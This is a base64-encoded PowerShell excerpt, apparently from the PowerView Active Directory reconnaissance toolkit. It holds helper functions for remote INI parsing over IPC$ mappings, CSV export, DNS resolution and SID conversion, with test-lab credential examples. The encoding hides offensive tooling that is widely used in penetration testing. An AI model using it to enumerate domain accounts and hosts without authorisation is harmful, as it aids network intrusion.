AgICAgIyBtYXAgSVBDJCB0byB0aGlzIGNvbXB1dGVyIGlmIGl0J3Mgbm90IGFscmVhZHkKICAgICAgICAgICAgICAgICAgICBBZGQtUmVtb3RlQ29ubmVjdGlvbiAtQ29tcHV0ZXJOYW1lICRIb3N0Q29tcHV0ZXIgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgICAgICAgICAkTWFwcGVkQ29tcHV0ZXJzWyRIb3N0Q29tcHV0ZXJdID0gJFRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkVGFyZ2V0UGF0aCkgewogICAgICAgICAgICAgICAgJEluaU9iamVjdCA9IEB7fQogICAgICAgICAgICAgICAgU3dpdGNoIC1SZWdleCAtRmlsZSAkVGFyZ2V0UGF0aCB7CiAgICAgICAgICAgICAgICAgICAgIl5cWyguKylcXSIgIyBTZWN0aW9uCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkU2VjdGlvbiA9ICRtYXRjaGVzWzFdLlRyaW0oKQogICAgICAgICAgICAgICAgICAgICAgICAkSW5pT2JqZWN0WyRTZWN0aW9uXSA9IEB7fQogICAgICAgICAgICAgICAgICAgICAgICAkQ29tbWVudENvdW50ID0gMAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAiXig7LiopJCIgIyBDb21tZW50CiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkVmFsdWUgPSAkbWF0Y2hlc1sxXS5UcmltKCkKICAgICAgICAgICAgICAgICAgICAgICAgJENvbW1lbnRDb3VudCA9ICRDb21tZW50Q291bnQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICROYW1lID0gJ0NvbW1lbnQnICsgJENvbW1lbnRDb3VudAogICAgICAgICAgICAgICAgICAgICAgICAkSW5pT2JqZWN0WyRTZWN0aW9uXVskTmFtZV0gPSAkVmFsdWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgIiguKz8pXHMqPSguKikiICMgS2V5CiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkTmFtZSwgJFZhbHVlID0gJG1hdGNoZXNbMS4uMl0KICAgICAgICAgICAgICAgICAgICAgICAgJE5hbWUgPSAkTmFtZS5UcmltKCkKICAgICAgICAgICAgICAgICAgICAgICAgJFZhbHVlcyA9ICRWYWx1ZS5zcGxpdCgnLCcpIHwgRm9yRWFjaC1PYmplY3QgeyAkXy5UcmltKCkgfQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFZhbHVlcyAtaXNub3QgW1N5c3RlbS5BcnJheV0pIHsgJFZhbHVlcyA9IEAoJFZhbHVlcykgfQogICAgICAgICAgICAgICAgICAgICAgICAkSW5pT2JqZWN0WyRTZWN0aW9uXVskTmFtZV0gPSAkVmFsdWVzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJEluaU9iamVjdAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIEVORCB7CiAgICAgICAgIyByZW1vdmUgdGhlIElQQyQgbWFwcGluZ3MKICAgICAgICAkTWFwcGVkQ29tcHV0ZXJzLktleXMgfCBSZW1vdmUtUmVtb3RlQ29ubmVjdGlvbgogICAgfQp9CgoKZnVuY3Rpb24gRXhwb3J0LVBvd2VyVmlld0NTViB7CjwjCi5TWU5PUFNJUwoKQ29udmVydHMgb2JqZWN0cyBpbnRvIGEgc2VyaWVzIG9mIGNvbW1hLXNlcGFyYXRlZCAoQ1NWKSBzdHJpbmdzIGFuZCBzYXZlcyB0aGUKc3RyaW5ncyBpbiBhIENTViBmaWxlIGluIGEgdGhyZWFkLXNhZmUgbWFubmVyLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lICAKCi5ERVNDUklQVElPTgoKVGhpcyBoZWxwZXIgZXhwb3J0cyBhbiAtSW5wdXRPYmplY3QgdG8gYSAuY3N2IGluIGEgdGhyZWFkLXNhZmUgbWFubmVyCnVzaW5nIGEgbXV0ZXguIFRoaXMgaXMgc28gdGhlIHZhcmlvdXMgbXVsdGktdGhyZWFkZWQgZnVuY3Rpb25zIGluClBvd2VyVmlldyBoYXMgYSB0aHJlYWQtc2FmZSB3YXkgdG8gZXhwb3J0IG91dHB1dCB0byB0aGUgc2FtZSBmaWxlLgpVc2VzIC5ORVQgSU8uRmlsZVN0cmVhbS9JTy5TdHJlYW1Xcml0ZXIgb2JqZWN0cyBmb3Igc3BlZWQuCgpPcmlnaW5hbGx5IGJhc2VkIG9uIERtaXRyeSBTb3RuaWtvdidzIEV4cG9ydC1DU1YgY29kZTogaHR0cDovL3Bvc2hjb2RlLm9yZy8xNTkwCgouUEFSQU1FVEVSIElucHV0T2JqZWN0CgpTcGVjaWZpZXMgdGhlIG9iamVjdHMgdG8gZXhwb3J0IGFzIENTViBzdHJpbmdzLgoKLlBBUkFNRVRFUiBQYXRoCgpTcGVjaWZpZXMgdGhlIHBhdGggdG8gdGhlIENTViBvdXRwdXQgZmlsZS4KCi5QQVJBTUVURVIgRGVsaW1pdGVyCgpTcGVjaWZpZXMgYSBkZWxpbWl0ZXIgdG8gc2VwYXJhdGUgdGhlIHByb3BlcnR5IHZhbHVlcy4gVGhlIGRlZmF1bHQgaXMgYSBjb21tYSAoLCkKCi5QQVJBTUVURVIgQXBwZW5kCgpJbmRpY2F0ZXMgdGhhdCB0aGlzIGNtZGxldCBhZGRzIHRoZSBDU1Ygb3V0cHV0IHRvIHRoZSBlbmQgb2YgdGhlIHNwZWNpZmllZCBmaWxlLgpXaXRob3V0IHRoaXMgcGFyYW1ldGVyLCBFeHBvcnQtUG93ZXJWaWV3Q1NWIHJlcGxhY2VzIHRoZSBmaWxlIGNvbnRlbnRzIHdpdGhvdXQgd2FybmluZy4KCi5FWEFNUExFCgpHZXQtRG9tYWluVXNlciB8IEV4cG9ydC1Qb3dlclZpZXdDU1YgLVBhdGggInVzZXJzLmNzdiIKCi5FWEFNUExFCgpHZXQtRG9tYWluVXNlciB8IEV4cG9ydC1Qb3dlclZpZXdDU1YgLVBhdGggInVzZXJzLmNzdiIgLUFwcGVuZCAtRGVsaW1pdGVyICd8JwoKLklOUFVUUwoKUFNPYmplY3QKCkFjY2VwdHMgb25lIG9yIG1vcmUgUFNPYmplY3RzIG9uIHRoZSBwaXBlbGluZS4KCi5MSU5LCgpodHRwOi8vcG9zaGNvZGUub3JnLzE1OTAKaHR0cDovL2RtaXRyeXNvdG5pa292LndvcmRwcmVzcy5jb20vMjAxMC8wMS8xOS9FeHBvcnQtQ3N2LWFwcGVuZC8KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNPYmplY3RbXV0KICAgICAgICAkSW5wdXRPYmplY3QsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFBvc2l0aW9uID0gMSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQYXRoLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMildCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQ2hhcl0KICAgICAgICAkRGVsaW1pdGVyID0gJywnLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRBcHBlbmQKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJE91dHB1dFBhdGggPSBbSU8uUGF0aF06OkdldEZ1bGxQYXRoKCRQU0JvdW5kUGFyYW1ldGVyc1snUGF0aCddKQogICAgICAgICRFeGlzdHMgPSBbU3lzdGVtLklPLkZpbGVdOjpFeGlzdHMoJE91dHB1dFBhdGgpCgogICAgICAgICMgbXV0ZXggc28gdGhyZWFkZWQgY29kZSBkb2Vzbid0IHN0b21wIG9uIHRoZSBvdXRwdXQgZmlsZQogICAgICAgICRNdXRleCA9IE5ldy1PYmplY3QgU3lzdGVtLlRocmVhZGluZy5NdXRleCAkRmFsc2UsJ0NTVk11dGV4JwogICAgICAgICROdWxsID0gJE11dGV4LldhaXRPbmUoKQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydBcHBlbmQnXSkgewogICAgICAgICAgICAkRmlsZU1vZGUgPSBbU3lzdGVtLklPLkZpbGVNb2RlXTo6QXBwZW5kCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkRmlsZU1vZGUgPSBbU3lzdGVtLklPLkZpbGVNb2RlXTo6Q3JlYXRlCiAgICAgICAgICAgICRFeGlzdHMgPSAkRmFsc2UKICAgICAgICB9CgogICAgICAgICRDU1ZTdHJlYW0gPSBOZXctT2JqZWN0IElPLkZpbGVTdHJlYW0oJE91dHB1dFBhdGgsICRGaWxlTW9kZSwgW1N5c3RlbS5JTy5GaWxlQWNjZXNzXTo6V3JpdGUsIFtJTy5GaWxlU2hhcmVdOjpSZWFkKQogICAgICAgICRDU1ZXcml0ZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5JTy5TdHJlYW1Xcml0ZXIoJENTVlN0cmVhbSkKICAgICAgICAkQ1NWV3JpdGVyLkF1dG9GbHVzaCA9ICRUcnVlCiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgRm9yRWFjaCAoJEVudHJ5IGluICRJbnB1dE9iamVjdCkgewogICAgICAgICAgICAkT2JqZWN0Q1NWID0gQ29udmVydFRvLUNzdiAtSW5wdXRPYmplY3QgJEVudHJ5IC1EZWxpbWl0ZXIgJERlbGltaXRlciAtTm9UeXBlSW5mb3JtYXRpb24KCiAgICAgICAgICAgIGlmICgtbm90ICRFeGlzdHMpIHsKICAgICAgICAgICAgICAgICMgb3V0cHV0IHRoZSBvYmplY3QgZmllbGQgbmFtZXMgYXMgd2VsbAogICAgICAgICAgICAgICAgJE9iamVjdENTViB8IEZvckVhY2gtT2JqZWN0IHsgJENTVldyaXRlci5Xcml0ZUxpbmUoJF8pIH0KICAgICAgICAgICAgICAgICRFeGlzdHMgPSAkVHJ1ZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgIyBvbmx5IG91dHB1dCBvYmplY3QgZmllbGQgZGF0YQogICAgICAgICAgICAgICAgJE9iamVjdENTVlsxLi4oJE9iamVjdENTVi5MZW5ndGgtMSldIHwgRm9yRWFjaC1PYmplY3QgeyAkQ1NWV3JpdGVyLldyaXRlTGluZSgkXykgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIEVORCB7CiAgICAgICAgJE11dGV4LlJlbGVhc2VNdXRleCgpCiAgICAgICAgJENTVldyaXRlci5EaXNwb3NlKCkKICAgICAgICAkQ1NWU3RyZWFtLkRpc3Bvc2UoKQogICAgfQp9CgoKZnVuY3Rpb24gUmVzb2x2ZS1JUEFkZHJlc3Mgewo8IwouU1lOT1BTSVMKClJlc29sdmVzIGEgZ2l2ZW4gaG9zdGVuYW1lIHRvIGl0cyBhc3NvY2lhdGVkIElQdjQgYWRkcmVzcy4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZSAgCgouREVTQ1JJUFRJT04KClJlc29sdmVzIGEgZ2l2ZW4gaG9zdGVuYW1lIHRvIGl0cyBhc3NvY2lhdGVkIElQdjQgYWRkcmVzcyB1c2luZwpbTmV0LkRuc106OkdldEhvc3RFbnRyeSgpLiBJZiBubyBob3N0bmFtZSBpcyBwcm92aWRlZCwgdGhlIGRlZmF1bHQKaXMgdGhlIElQIGFkZHJlc3Mgb2YgdGhlIGxvY2FsaG9zdC4KCi5FWEFNUExFCgpSZXNvbHZlLUlQQWRkcmVzcyAtQ29tcHV0ZXJOYW1lIFNFUlZFUgoKLkVYQU1QTEUKCkAoIlNFUlZFUjEiLCAiU0VSVkVSMiIpIHwgUmVzb2x2ZS1JUEFkZHJlc3MKCi5JTlBVVFMKClN0cmluZwoKQWNjZXB0cyBvbmUgb3IgbW9yZSBJUCBhZGRyZXNzIHN0cmluZ3Mgb24gdGhlIHBpcGVsaW5lLgoKLk9VVFBVVFMKClN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDdXN0b21PYmplY3QKCkEgY3VzdG9tIFBTT2JqZWN0IHdpdGggdGhlIENvbXB1dGVyTmFtZSBhbmQgSVBBZGRyZXNzLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0N1c3RvbU9iamVjdCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAkRW52OkNPTVBVVEVSTkFNRQogICAgKQoKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBAKChbTmV0LkRuc106OkdldEhvc3RFbnRyeSgkQ29tcHV0ZXIpKS5BZGRyZXNzTGlzdCkgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRfLkFkZHJlc3NGYW1pbHkgLWVxICdJbnRlck5ldHdvcmsnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRPdXQgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJUEFkZHJlc3MnICRfLklQQWRkcmVzc1RvU3RyaW5nCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXQKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1Jlc29sdmUtSVBBZGRyZXNzXSBDb3VsZCBub3QgcmVzb2x2ZSAkQ29tcHV0ZXIgdG8gYW4gSVAgQWRkcmVzcy4iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBDb252ZXJ0VG8tU0lEIHsKPCMKLlNZTk9QU0lTCgpDb252ZXJ0cyBhIGdpdmVuIHVzZXIvZ3JvdXAgbmFtZSB0byBhIHNlY3VyaXR5IGlkZW50aWZpZXIgKFNJRCkuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IENvbnZlcnQtQUROYW1lLCBHZXQtRG9tYWluT2JqZWN0LCBHZXQtRG9tYWluICAKCi5ERVNDUklQVElPTgoKQ29udmVydHMgYSAiRE9NQUlOXHVzZXJuYW1lIiBzeW50YXggdG8gYSBzZWN1cml0eSBpZGVudGlmaWVyIChTSUQpCnVzaW5nIFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuTlRBY2NvdW50J3MgdHJhbnNsYXRlIGZ1bmN0aW9uLiBJZiBhbHRlcm5hdGUKY3JlZGVudGlhbHMgYXJlIHN1cHBsaWVkLCB0aGVuIEdldC1BRE9iamVjdCBpcyB1c2VkIHRvIHRyeSB0byBtYXAgdGhlIG5hbWUKdG8gYSBzZWN1cml0eSBpZGVudGlmaWVyLgoKLlBBUkFNRVRFUiBPYmplY3ROYW1lCgpUaGUgdXNlci9ncm91cCBuYW1lIHRvIGNvbnZlcnQsIGNhbiBiZSAndXNlcicgb3IgJ0RPTUFJTlx1c2VyJyBmb3JtYXQuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIGZvciB0aGUgdHJhbnNsYXRpb24sIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvIGZvciB0aGUgdHJhbnNsYXRpb24uCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKClNwZWNpZmllcyBhbiBhbHRlcm5hdGUgY3JlZGVudGlhbCB0byB1c2UgZm9yIHRoZSB0cmFuc2xhdGlvbi4KCi5FWEFNUExFCgpDb252ZXJ0VG8tU0lEICdERVZcZGZtJwoKLkVYQU1QTEUKCidERVZcZGZtJywnREVWXGtyYnRndCcgfCBDb252ZXJ0VG8tU0lECgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKJ1RFU1RMQUJcZGZtJyB8IENvbnZlcnRUby1TSUQgLUNyZWRlbnRpYWwgJENyZWQKCi5JTlBVVFMKClN0cmluZwoKQWNjZXB0cyBvbmUgb3IgbW9yZSB1c2VybmFtZSBzcGVjaWZpY2F0aW9uIHN0cmluZ3Mgb24gdGhlIHBpcGVsaW5lLgoKLk9VVFBVVFMKClN0cmluZwoKQSBzdHJpbmcgcmVwcmVzZW50aW5nIHRoZSBTSUQgb2YgdGhlIHRyYW5zbGF0ZWQgbmFtZS4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoW1N0cmluZ10pXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdOYW1lJywgJ0lkZW50aXR5JyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRPYmplY3ROYW1lLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkRG9tYWluU2VhcmNoZXJBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkRG9tYWluU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJERvbWFpblNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkRG9tYWluU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkT2JqZWN0IGluICRPYmplY3ROYW1lKSB7CiAgICAgICAgICAgICRPYmplY3QgPSAkT2JqZWN0IC1SZXBsYWNlICcvJywnXCcKCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAgICAgJEROID0gQ29udmVydC1BRE5hbWUgLUlkZW50aXR5ICRPYmplY3QgLU91dHB1dFR5cGUgJ0ROJyBARG9tYWluU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgIGlmICgkRE4pIHsKICAgICAgICAgICAgICAgICAgICAkVXNlckRvbWFpbiA9ICRETi5TdWJTdHJpbmcoJEROLkluZGV4T2YoJ0RDPScpKSAtcmVwbGFjZSAnREM9JywnJyAtcmVwbGFjZSAnLCcsJy4nCiAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lID0gJEROLlNwbGl0KCcsJylbMF0uc3BsaXQoJz0nKVsxXQoKICAgICAgICAgICAgICAgICAgICAkRG9tYWluU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkVXNlck5hbWUKICAgICAgICAgICAgICAgICAgICAkRG9tYWluU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJFVzZXJEb21haW4KICAgICAgICAgICAgICAgICAgICAkRG9tYWluU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICdvYmplY3RzaWQnCiAgICAgICAgICAgICAgICAgICAgR2V0LURvbWFpbk9iamVjdCBARG9tYWluU2VhcmNoZXJBcmd1bWVudHMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmQgb2JqZWN0c2lkCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIGlmICgkT2JqZWN0LkNvbnRhaW5zKCdcJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpbiA9ICRPYmplY3QuU3BsaXQoJ1wnKVswXQogICAgICAgICAgICAgICAgICAgICAgICAkT2JqZWN0ID0gJE9iamVjdC5TcGxpdCgnXCcpWzFdCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2VpZiAoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW5TZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluID0gKEdldC1Eb21haW4gQERvbWFpblNlYXJjaGVyQXJndW1lbnRzKS5OYW1lCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAkT2JqID0gKE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5OVEFjY291bnQoJERvbWFpbiwgJE9iamVjdCkpCiAgICAgICAgICAgICAgICAgICAgJE9iai5UcmFuc2xhdGUoW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyXSkuVmFsdWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbQ29udmVydFRvLVNJRF0gRXJyb3IgY29udmVydGluZyAkRG9tYWluXCRPYmplY3QgOiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIENvbnZlcnRGcm9tLVNJRCB7CjwjCi5TWU5PUFNJUwoKQ29udmVydHMgYSBzZWN1cml0eSBpZGVudGlmaWVyIChTSUQpIHRvIGEgZ3JvdXAvdXNlciBuYW1lLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBDb252ZXJ0LUFETmFtZSAgCgouREVTQ1JJUFRJT04KCkNvbnZlcnRzIGEgc2VjdXJpdHkgaWRlbnRpZmllciBzdHJpbmcgKFNJRCkgdG8gYSBncm91cC91c2VyIG5hbWUKdXNpbmcgQ29udmVydC1BRE5hbWUuCgouUEFSQU1FVEVSIE9iamVjdFNpZAoKU3BlY2lmaWVzIG9uZSBvciBtb3JlIFNJRHMgdG8gY29udmVydC4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSB0cmFuc2xhdGlvbiwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8gZm9yIHRoZSB0cmFuc2xhdGlvbi4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKU3BlY2lmaWVzIGFuIGFsdGVybmF0ZSBjcmVkZW50aWFsIHRvIHVzZSBmb3IgdGhlIHRyYW5zbGF0aW9uLgoKLkVYQU1QTEUKCkNvbnZlcnRGcm9tLVNJRCBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgKClRFU1RMQUJcaGFybWoweQoKLkVYQU1QTEUKCiJTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDciLCAiUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4IiwgIlMtMS01LTMyLTU2MiIgfCBDb252ZXJ0RnJvbS1TSUQKClRFU1RMQUJcV0lORE9XUzIkClRFU1RMQUJcaGFybWoweQpCVUlMVElOXERpc3RyaWJ1dGVkIENPTSBVc2VycwoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtJywgJFNlY1Bhc3N3b3JkKQpDb252ZXJ0RnJvbS1TSUQgUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4IC1DcmVkZW50aWFsICRDcmVkCgpURVNUTEFCXGhhcm1qMHkKCi5JTlBVVFMKClN0cmluZwoKQWNjZXB0cyBvbmUgb3IgbW9yZSBTSUQgc3RyaW5ncyBvbiB0aGUgcGlwZWxpbmUuCgouT1VUUFVUUwoKU3RyaW5nCgpUaGUgY29udmVydGVkIERPTUFJTlx1c2VybmFtZS4KIz4KCiAgICBbT3V0cHV0VHlwZShbU3RyaW5nXSldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ1NJRCcpXQogICAgICAgIFtWYWxpZG